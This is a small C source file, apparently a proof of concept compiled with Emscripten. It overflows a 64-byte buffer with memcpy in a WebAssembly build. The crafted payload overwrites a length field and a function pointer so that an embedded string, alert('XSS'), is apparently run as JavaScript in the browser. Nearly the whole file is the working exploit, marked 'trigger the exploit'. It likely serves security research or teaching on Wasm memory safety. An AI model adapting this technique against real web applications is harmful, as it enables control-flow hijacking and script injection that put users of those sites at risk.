#include <stdio.h>
#include <emscripten.h>
#include <stdint.h>

struct Communication {
	char msg[64];
	uint16_t msg_len;
	void (*out) (const char *);
};


void printCommunication(Communication * comms) {
	comms->out(comms->msg);
}

void printLine(const char *msg) {
	printf("%s\n", msg);
}

int main() {
	Communication comms;
	comms.out = &printLine;
	
	char *payload = "alert('XSS');// " //16 byte attack script
					"                " //16 byte padding
					"                " //16 byte padding
					"                " //16 byte padding
					"  "			   //2 byte padding
					"\x40\x00"         //msg_len=68
					"\x05\x00\x00\x00";//out=72
					
	memcpy(comms.msg, payload, 72);
	printCommunication(&comms); //trigger the exploit
	
	return 0;
}



